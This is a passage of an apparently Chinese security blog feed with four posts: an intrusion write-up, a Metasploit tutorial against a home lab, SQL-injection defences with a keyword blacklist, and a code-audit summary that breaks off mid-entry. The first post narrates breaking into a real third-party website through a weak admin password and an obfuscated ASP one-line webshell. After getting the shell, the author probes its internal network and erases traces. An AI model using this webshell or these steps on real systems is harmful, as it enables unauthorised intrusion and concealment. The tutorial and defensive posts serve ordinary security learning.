    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>很久之前通过数据库备份拿到的一个webshell，本来准备等他们修复了之后再写的，但是提交了漏洞和修复方案他们接收之后很长时间没有修复，忽视了漏洞。所以今天写出来了。</p><h2 id="0x01-多次尝试"><a href="#0x01-多次尝试" class="headerlink" title="0x01 多次尝试"></a>0x01 多次尝试</h2><p>首先这个站是偶然google hacking时找到的后台弱密码，进入后台之后发现是IIS6.0的服务器：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback01.png"></p><p>这个后台可以对前端的文章、新闻等进行修改，发现可以上传图片到文章中，是一个上传点。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback02.png"></p><p>先编辑一个一句话木马,存为asp格式</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;%eval<span class="hljs-string">&quot;&quot;</span>&amp;(<span class="hljs-string">&quot;e&quot;</span>&amp;<span class="hljs-string">&quot;v&quot;</span>&amp;<span class="hljs-string">&quot;a&quot;</span>&amp;<span class="hljs-string">&quot;l&quot;</span>&amp;<span class="hljs-string">&quot;(&quot;</span>&amp;<span class="hljs-string">&quot;r&quot;</span>&amp;<span class="hljs-string">&quot;e&quot;</span>&amp;<span class="hljs-string">&quot;q&quot;</span>&amp;<span class="hljs-string">&quot;u&quot;</span>&amp;<span class="hljs-string">&quot;e&quot;</span>&amp;<span class="hljs-string">&quot;s&quot;</span>&amp;<span class="hljs-string">&quot;t&quot;</span>&amp;<span class="hljs-string">&quot;(&quot;</span>&amp;<span class="hljs-string">&quot;0&quot;</span>&amp;<span class="hljs-string">&quot;-&quot;</span>&amp;<span class="hljs-string">&quot;2&quot;</span>&amp;<span class="hljs-string">&quot;-&quot;</span>&amp;<span class="hljs-string">&quot;4&quot;</span>&amp;<span class="hljs-string">&quot;)&quot;</span>&amp;<span class="hljs-string">&quot;)&quot;</span>)%&gt; <br></code></pre></td></tr></table></figure><p>直接上传.asp文件，被防火墙阻止。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback03.png"></p><p>先上传.jpg文件，然后通过burpsuite更改后缀为.asp，然后上传，发现仍然被拦截，看来是后端拦截。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback04.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback05.png"></p><p>尝试使用IIS6.0的解析漏洞，将.asp;.jpg文件解析成.asp文件，但是更改了一个1.asp;.jpg后缀的文件上传之后，文件名整体被改成一个日期的+随机数+.jpg的文件名。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback06.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback07.png"></p><p>尝试用burpsuite改数据，0x00截断方式、超长文件名仍然不可行。</p><h2 id="0x02-改变思路"><a href="#0x02-改变思路" class="headerlink" title="0x02 改变思路"></a>0x02 改变思路</h2><p>本来测试到这里我已经放弃通过上传点来getshell，但是不甘心就去问了下朋友，朋友说他正好在复现这个kindeditor编辑器的漏洞，为我提供了其他思路，我去网上找了一会kindeditor编辑器漏洞版本，尝试了一会，发现目前这个版本是4.1.10不存在之前那些典型的漏洞。</p><p>然后这个时候朋友告诉我有数据库备份，可以通过数据库备份功能来利用解析漏洞。</p><h2 id="0x03-开始尝试"><a href="#0x03-开始尝试" class="headerlink" title="0x03 开始尝试"></a>0x03 开始尝试</h2><p>先编辑一个过狗asp马，更改为jpg格式上传。</p><p>然后在数据库备份界面，发现直接无法更改备份的源路径和目的路径</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback08.png"></p><p>但是这两个路径是前端可控的，那就很容易了，直接f12更改页面中对应的原路径为自己上传的图片马，目的路径为123.asp即可。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback09.png"></p><p>然后备份数据库，在upload路径找到自己的马，直接用菜刀连接，成功getshell。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback10.png"></p><p>后来传大马稍微对内网测试了一下，然后完成之后清理痕迹。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>虽然是很老的一个漏洞了，没有太多亮点，但是体现了渗透测试过程中要力求多样性，了解的方式和技巧越多，就距离成功越接近。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试框架metasploit</title>
    <link href="/2018/05/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6metasploit/"/>
    <url>/2018/05/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6metasploit/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>Metasploit是一款开源安全漏洞检测工具，可以用于渗透测试不同的系统和框架，附带数百个已知的软件漏洞，并保持频繁更新。</p><p>Metasploit框架是用Ruby语言开发的，包括Perl写的脚本，C ，汇编，和Python各种组件，并且可以由用户自行编写代码加入Metasploit的数据库。</p><h2 id="0x01-术语"><a href="#0x01-术语" class="headerlink" title="0x01 术语"></a>0x01 术语</h2><p>在讲解Metasploit之前，先对我们即将用到的术语做一个解释。</p><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p>Exploit操纵计算机系统中特定漏洞的恶意代码. Metasploi提供了跨多个操作系统和应用程序的Exploit，提供了突破一台电脑的多种途径。可以用Nessus搭配Nmap进行漏洞扫描,并使用Metasploit进行漏洞利用。在确定一个特定的漏洞却无法在Metasploit数据库中找到利用的Exploit，可以通过访问exploit-db.com查找下载该漏洞利用程序，编译知道可以将其移植到Metasploit的数据库做为一个Exploit。</p><h4 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h4><p>利用漏洞之前要先建立一个Payload,其作用是确定漏洞攻击成功之后要执行什么操作，Payload基本上是用于访问远程计算机的反向shell和通过shell植入后门等到被入侵的电脑。</p><h4 id="Encoders"><a href="#Encoders" class="headerlink" title="Encoders"></a>Encoders</h4><p>不能确保所有Metasploit中的exp都可以正常工作，有时候会遇到防火墙、IPS、IDC等，所有的试图攻击等可能会被防火墙过滤掉，这时候就需要使用Encoders来对exp进行编码等，用来逃避防火墙、IPS、IDS的检测。</p><h4 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h4><p>所有的Exploit和Payload都有一些内置的参数，诸如远程IP、本地IP、LPORT、RPORT、服务路径、用户名等。这些参数在利用exp之前需要进行配置，可以使用Show Options命令来显示具体的选项。</p><h2 id="0x02-模式"><a href="#0x02-模式" class="headerlink" title="0x02 模式"></a>0x02 模式</h2><p>Metasploit有三种模式供用户使用，分别是控制台、命令行、web，我分别简述一下三种模块的优点。</p><p>Msfconsole（控制台）的优点是最实用、最强大的集各种功能于一体的漏洞利用框架，在控制台界面时功能最全面。</p><p>Msfcli（命令行）的优点是侧重对脚本执行、以及可解释性，并且自动化方面很强。</p><p>Msfweb（web界面）是一个Gui形界面，主要优点是为了让渗透测试操作变得更加容易，从命令行启动之后会创建一个web server,ip地址是127.0.0.1,端口是55553。</p><p>我使用Msfconsole来演示。</p><h2 id="0x03-模块"><a href="#0x03-模块" class="headerlink" title="0x03 模块"></a>0x03 模块</h2><p>我们在安装目录输入./Msfupdate更新一下metasploit</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit01.png"></p><p>然后使用service postgresql start打开漏洞数据库服务</p><p>然后使用./Msfconsole命令进入控制台交互界面，然后开始模块的使用。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit02.png"></p><h4 id="show模块"><a href="#show模块" class="headerlink" title="show模块"></a>show模块</h4><p>show模块可以用来显示可用的exploits、payloads、encoders等等</p><p>我们可以直接加参数来只显示某一类</p><p>如show exploits</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit03.png"></p><p>显示出来的有exp的名字、时间、攻击模块等级和描述。</p><p>等级是我们选取时优先关注的，一般选择excellent和great两种等级，因为稳定且效果明显，其次查看后面的描述是否和我们攻击的服务有关，如果找到合适的模块，我们就可以记住名字之后使用。</p><h4 id="search模块"><a href="#search模块" class="headerlink" title="search模块"></a>search模块</h4><p>我们之前使用show的时候出现了非常多的条目，但在应对实际情况中，肯定不能自己肉眼去寻找需要的exp，而search模块可以帮助我们快速筛选需要的exp。</p><p>我们可以查看search -h的内容帮助我们学会这个模块的用法。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit04.png"></p><p>如search cve:2017 type:exploit</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit05.png"></p><p>然后我们再根据攻击模块等级和描述进一步人工筛选，就快了很多。</p><h4 id="info模块"><a href="#info模块" class="headerlink" title="info模块"></a>info模块</h4><p>上面列举出来的模块我们只能看到大概信息，如果我们想要查看详细信息和利用方式等等，就得使用info模块来查看</p><p>使用方法是info+模块名</p><p>如struct-s2-052漏洞即cve:2017-9805：</p><p>info exploit/multi/http/struts2_rest_xstream</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit06.png"></p><h4 id="use模块"><a href="#use模块" class="headerlink" title="use模块"></a>use模块</h4><p>前面我们筛选出来合适的exp，下来就需要用use模块来使用这个exp</p><p>使用方式是use+模块名</p><p>如struct-s2-052漏洞</p><p>use exploit/multi/http/struts2_rest_xstream</p><h4 id="set模块"><a href="#set模块" class="headerlink" title="set模块"></a>set模块</h4><p>选好了模块下来就该攻击了，那攻击谁？怎么攻击？需要用这次攻击做什么事情？这些事情我们还没有告诉metasploit，所以我们需要用set来完成这些设置。</p><p>首先我们需要一个payload完成我们要做的事情，我们通过前面的show命令，查看一下payload</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit07.png"></p><p>然后再选择一个payload，用set payload PayloadName 来设置好这次攻击用到的payload</p><p>这里我们用一个较稳定的反弹shell</p><p>set payload windows/exec</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit08.png"></p><p>接着设置攻击参数，具体有哪些攻击参数需要设置，我们可以用show options命令查看。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit09.png"></p><p>然后我们根据看到的情况，结合我们要攻击的目标设置攻击参数，我这里在物理机重新搭了一遍struct-2-052漏洞的环境，可以参考之前的一篇博客进行配置： <a href="http://uuzdaisuki.com/2018/01/22/struts2-052%E6%BC%8F%E6%B4%9E/">http://uuzdaisuki.com/2018/01/22/struts2-052%E6%BC%8F%E6%B4%9E/</a></p><p>额外将tomcat/conf/server.xml中的这两处地方改为本机在局域网中的ip，就可以通过另一台机器访问了。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit10.png"></p><p>接下来在metasploit中设置物理机的ip和端口即可</p><p>set rhost 192.168.0.107</p><p>set rport 12345</p><p>set lhost 192.168.0.108</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit11.png"></p><h4 id="run模块"><a href="#run模块" class="headerlink" title="run模块"></a>run模块</h4><p>万事俱备之后，设置好我们想执行的命令，直接输入run，即可发起攻击。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit12.png"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>一款优秀的工具对渗透测试人员来说就像一把锋利的刀，他不仅能节省我们非常多的时间，也能弥补我们技术上的空白。</p><p>metasploit还有非常多有趣的用法，我也是初学所以无法一一列举出来，学习新工具的过程，最需要的是耐心的读官方文档和善用-help命令，并且记好笔记。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>渗透测试</tag>
      
      <tag>metasploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入之代码层防御策略</title>
    <link href="/2018/05/14/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%B1%82%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5/"/>
    <url>/2018/05/14/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%BB%A3%E7%A0%81%E5%B1%82%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前写sql注入的博客都是站在攻击者角度上的，这次站在防御方的角度上，总结一下代码层防御sql注入的一些方法。</p><h2 id="0x01-代码层防御"><a href="#0x01-代码层防御" class="headerlink" title="0x01 代码层防御"></a>0x01 代码层防御</h2><p>在易受sql注入攻击的应用程序开发过程中，如果我们在代码里面进行一些合理的过滤和安全措施，就可以防范绝大多数的sql注入。</p><h2 id="0x02-参数化语句"><a href="#0x02-参数化语句" class="headerlink" title="0x02 参数化语句"></a>0x02 参数化语句</h2><p>引发sql注入最根本的原因是将sql语句创建成字符串发送给数据库，即动态sql。</p><p>而现在大多数程序在访问数据库时已然采用了参数化语句的方式，即用占位符或者绑定变量来向sql查询提供参数，而非直接让用户使用sql语句。显然，这种方式提升了安全性。</p><p>我们给出一段代码来说明参数化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;xxxxx&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;xxxxx&quot;</span>;<br><span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-variable">$username</span> = request(<span class="hljs-string">&quot;username&quot;</span>);<br><span class="hljs-variable">$password</span> = request(<span class="hljs-string">&quot;password&quot;</span>);<br>sql = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&#x27;and password = &#x27;&quot;</span>.<span class="hljs-variable">$password</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure><p>我们可以看到，这是如今大多数后台都会采用的书写方式，他比起直接让用户控制sql语句减少了一定的风险，但是在之前写的渗透测试方式中，仍然有无数种方法成功注入。所以我们还得继续加一层保险——对参数进行输入验证。</p><h2 id="0x03-php中输入验证"><a href="#0x03-php中输入验证" class="headerlink" title="0x03 php中输入验证"></a>0x03 php中输入验证</h2><p>我们首先看一下在php中怎么进行输入验证。<br>php中我们能用到的函数如下：</p><ul><li>preg_match(reg,match): 使用正则表达式reg对match字符串进行正则匹配。</li><li>is_<type>(input): 检查输入input是否为<type>，如检查数字is_numeric()。</li><li>strlen(input): 检查输入的长度。</li></ul><p>其中preg_match如果用/i可以匹配大小写不敏感的数据，所以大小写混用也是无法绕过的。</p><p>假如黑名单过滤，我们只要匹配出任意违法字符，就禁止入库并且返回违法输入的提示。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">$username=$_POST[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/*|#|;|,|is|file|drop|union|select|ascii|mid|from|(|)|or|\^|=|&lt;|&gt;|like|regexp|for|and|limit|file|--|||&amp;|&quot;</span>.urldecode(<span class="hljs-string">&#x27;%09&#x27;</span>).<span class="hljs-string">&quot;|&quot;</span>.urldecode(<span class="hljs-string">&quot;%0b&quot;</span>).<span class="hljs-string">&quot;|&quot;</span>.urldecode(<span class="hljs-string">&#x27;%0c&#x27;</span>).<span class="hljs-string">&quot;|&quot;</span>.urldecode(<span class="hljs-string">&#x27;%0d&#x27;</span>).<span class="hljs-string">&quot;|&quot;</span>.urldecode(<span class="hljs-string">&#x27;%a0&#x27;</span>).<span class="hljs-string">&quot;/i&quot;</span>,$username))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;illegal input!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    echo <span class="hljs-string">&quot;success!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>再比如白名单过滤，我们可以仅允许数字字母，如果有超出数字字母的字符使匹配失败，就禁止入库并且返回违法输入的提示。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/^[a-z\d]*$/i&quot;</span>,<span class="hljs-variable">$username</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;illegal input!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x04-java中输入验证"><a href="#0x04-java中输入验证" class="headerlink" title="0x04 java中输入验证"></a>0x04 java中输入验证</h2><p> Java中的输入验证支持专属于正在使用的框架，如下是使用构建Web应用的框架JSF(Java Server Faces)对输入验证提供支持的示例代码，定义了一个输入验证类，实现了javax.faces.validator.Validator接口。</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UsernameValidator</span> <span class="hljs-keyword"><span class="hljs-keyword">implements</span> <span class="hljs-type">Validator</span></span> </span>&#123;<br>    <span class="hljs-keyword">public</span> void validate(FacesContent faceContext, UIComponent uiComponent, Object value) throws ValidatorException<br>&#123;<br>    <span class="hljs-comment">// get the username and transform it to a string</span><br>    <span class="hljs-keyword">String</span> username = (<span class="hljs-keyword">String</span>) value;<br><br>    <span class="hljs-comment">// build a regexp</span><br>    Pattern p = Pattern.compile(<span class="hljs-string">&quot;^[a-zA-Z]&#123;8,12&#125;$&quot;</span>);<br><br>    <span class="hljs-comment">// match the user name</span><br>    Matcher m = p.matcher(username);<br>    <br>    <span class="hljs-keyword">if</span>(!matchFound) &#123;<br>    　　FacesMessage message = <span class="hljs-keyword">new</span> <span class="hljs-type">FacesMessage</span>();<br>   　　 message.setDetail(<span class="hljs-string">&quot;Invalid Input-- Must be 8-12 letters&quot;</span>);<br>　　　　message.setSummary(<span class="hljs-string">&quot;Username invalid&quot;</span>);<br>　　　　message.setServerity(FacesMessage.SERVERITY_ERROR);<br>　　　　<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">validatorException</span>(message);<br>　　&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要将以下内容添加到faces-config.xml中以便启用上述验证器:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">validator</span>&gt;<br>    &lt;<span class="hljs-keyword">validator</span>-id&gt;namespace.UsernameValidator&lt;/<span class="hljs-keyword">validator</span>-id&gt;<br>    &lt;<span class="hljs-keyword">validator</span>-<span class="hljs-keyword">class</span>&gt;namespace.package.UsernameValidator&lt;/<span class="hljs-keyword">validator</span>-<span class="hljs-keyword">class</span>&gt;<br>&lt;/<span class="hljs-keyword">validator</span>&gt;<br></code></pre></td></tr></table></figure><p>然后在相关JSP文件中引用在faces-config.xml中添加的内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h:inputText</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">required</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">f:validator</span> <span class="hljs-attr">validatorId</span>=<span class="hljs-string">&quot;namespace.UsernameValidator&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h:input</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="0x05-net中输入验证"><a href="#0x05-net中输入验证" class="headerlink" title="0x05 .net中输入验证"></a>0x05 .net中输入验证</h2><p>ASP.NET提供了很多用于输入验证的内置控件，其中最有用的是RegularExpressionValidator控件和CustomValidator控件，下面示例代码是RegularExpressionValidator验证用户名的例子：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;asp:textbox <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;userName&quot;</span> <span class="hljs-attribute">runat</span>=<span class="hljs-string">&quot;server&quot;</span>/&gt;<br>&lt;asp:RegularExpressionValidator <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;userNameRegEx&quot;</span> <span class="hljs-attribute">runat</span>=<span class="hljs-string">&quot;server&quot;</span> <span class="hljs-attribute">ControlToValidate</span>=<span class="hljs-string">&quot;userName&quot;</span><br>ErrorMessage = <span class="hljs-string">&quot;Username must contain 8-12 letters.&quot;</span> <span class="hljs-attribute">ValidationExpression</span>=<span class="hljs-string">&quot;^[a-zA-Z]&#123;8-12&#125;$&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>下面的代码是使用CustomValidator验证口令是否为正确格式的示例：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;asp:textbox <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;txtPassword&quot;</span> <span class="hljs-attribute">runat</span>=<span class="hljs-string">&quot;server&quot;</span>/&gt;<br>&lt;asp:CustomerValidator <span class="hljs-attribute">runat</span>=<span class="hljs-string">&quot;server&quot;</span> <span class="hljs-attribute">Controlvalidate</span>=<span class="hljs-string">&quot;txtPassword&quot;</span> <span class="hljs-attribute">CLientValidationFunction</span>=<span class="hljs-string">&quot;clientPwdValidate&quot;</span><br><span class="hljs-attribute">ErrorMessage</span>=<span class="hljs-string">&quot;Password does not meet the requirements.&quot;</span> <span class="hljs-attribute">onServerValidate</span>=<span class="hljs-string">&quot;PwdValidate&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="0x06-html中输入验证"><a href="#0x06-html中输入验证" class="headerlink" title="0x06 html中输入验证"></a>0x06 html中输入验证</h2><p>在写html输入验证之前先强调一点，html中的验证是基于前端的，而基于前端的验证就是客户端可以在浏览器直接更改的，所以他是不可靠的，没有实际作用的。在html验证之后，一定还要在后端重新验证。</p><p>但是为什么还要提他呢？因为在很多情况，如果我们过滤十分严格，输入一些敏感参数的人并不一定都是攻击者，这个时候每条语句都拿到后端判断然后跳转十分浪费时间，所以在前端给出一定的限制和提示，就能提升正常用户的体验。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">required</span>=<span class="hljs-string">&quot;required&quot;</span> <span class="hljs-attribute">patter</span>=<span class="hljs-string">&quot;^[a-zA-Z\d]*&quot;</span> <span class="hljs-built_in">..</span>.&gt;<br></code></pre></td></tr></table></figure><h2 id="0x07-编码输出"><a href="#0x07-编码输出" class="headerlink" title="0x07 编码输出"></a>0x07 编码输出</h2><p>我们都清楚，白名单过滤要比黑名单过滤安全的多，在能使用白名单的时候尽量使用白名单，但是很多时候业务需求不能让我们使用白名单，这个时候我们就要使用黑名单结合编码的方式，提升安全性。</p><p>我对其他几个语言不是非常熟悉，这里就只介绍一下php的编码函数。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_defense/SQL%20defense01.png"></p><p>这些编码函数，能够将允许范围内的违法字符编码后再存入数据库，能一定程度的防止我们构造语句逃逸，提升了安全性。</p><p>但是这些函数没有用对，仍然会出现一些问题，接下来我分享一下上图中我所了解的一些编码函数会存在的安全问题：</p><ul><li><p>其中htmlspecialchars() 这个函数对xss的过滤十分有效，但是直接使用它时，它只会转义&lt;&gt;符号，对sql注入是没有任何防御效果的，只有加入ENT_COMPAT参数过滤单引号或者加入ENT_QUOTES参数过滤单、双引号，才能用在sql注入的防御中。</p></li><li><p>其中addslashes()函数，如果在设置了编码的页面如“set character_set_client=gbk” ，就可能造成宽字节注入，在编码时将反斜杠吃掉。</p></li></ul><ul><li>其中addslashes()函数和urlencode()或者一些其他的编码函数如big5码的编码函数组合使用时，就可能造成二次注入，用编码产生新的单引号。</li></ul><p>目前我最常见到的就是这几种，以后遇到新的还会及时补充。</p><h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>开发人员在代码层稍微多费一点时间增加一些函数，就可以抵御绝大多数的攻击，所以在代码层做防御是十分必要的，但是并不是说做了一些措施就一定能高枕无忧。要想提升整个系统的安全性，需要的是多种技术多个层面的防御相互结合。</p>]]></content>
    
    
    <categories>
      
      <category>防御策略</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
      <tag>mysql</tag>
      
      <tag>sql注入</tag>
      
      <tag>防御策略</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计总结</title>
    <link href="/2018/05/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/"/>
    <url>/2018/05/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近在锻炼自己的代码审计能力，所以准备总结一下审计的方法和技巧。</p><h2 id="0x01-漏洞类型"><a href="#0x01-漏洞类型" class="headerlink" title="0x01 漏洞类型"></a>0x01 漏洞类型</h2><ul><li>sql注入</li><li>xss</li><li>文件包含</li><li>文件上传</li><li>反序列化</li><li>csrf</li><li>ssrf</li><li>代码执行</li></ul><h2 id="0x02-sql注入"><a href="#0x02-sql注入" class="headerlink" title="0x02 sql注入"></a>0x02 sql注入</h2><h4 id="基本sql注入"><a href="#基本sql注入" class="headerlink" title="基本sql注入"></a>基本sql注入</h4><p>对于基本的sql注入的审计，可以通过$_GET,$_POST等传参追踪数据库操作，也可以通过select , delete , update,insert 数据库操作语句反追踪传参。</p><p>主要注意查看有无过滤，有没有转义，有没有参数化。</p><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>在关键部分经过转义等操作也不是完全高枕无忧了，如果代码中存在一些utf-8、gbk、big5等编码的函数，就很有可能被传入一些字符吃掉反斜杠，如%df’ and ‘ 1=1’，由于反斜杠是%5c，%df%5c在编码处理时组成了“運”这种情况，使过滤功亏一篑，所以在这些存在编码的位置，要分析并测试会不会引起上述问题。</p><h4 id="httpheader的参数"><a href="#httpheader的参数" class="headerlink" title="httpheader的参数"></a>httpheader的参数</h4><p>有些系统可能会将referer，X_Forwarded_For还有cookie等参数传入数据库，一般的防注入系统考虑了get和post的参数值，而忽略了这些值的检测，并且这些值都是用户可以控制的，所以也要关注一下。</p><h4 id="二次注入"><a href="#二次注入" class="headerlink" 